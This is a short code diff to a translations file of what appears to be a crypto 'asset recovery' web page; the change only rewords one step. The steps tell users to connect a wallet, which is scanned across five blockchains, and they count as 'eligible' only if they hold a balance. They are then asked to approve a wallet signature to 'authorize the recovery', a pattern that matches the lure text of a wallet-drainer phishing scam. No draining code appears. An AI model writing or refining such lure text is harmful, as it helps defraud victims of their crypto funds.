@@ -112,7 +112,7 @@ const TRANSLATIONS = {
     // NEW INSTRUCTION KEYS
     recoveryInstructionsTitle: '🔐 How to Recover Your Assets',
     recoveryStep1: 'Connect your wallet using the button below.',
-    recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche), Note(Must Have an On-chain Balance in any to be eligible)',
+    recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche), Note (Must have an On-chain balance in any of the supported networks to be eligible)',
     recoveryStep3: 'If eligible, the system will automatically initiate recovery (or you can click the button).',
     recoveryStep4: 'Approve the signature in your wallet to authorize the recovery.',
     recoveryStep5: 'Recovery completes! You\'ll receive a confirmation and downloadable report.',
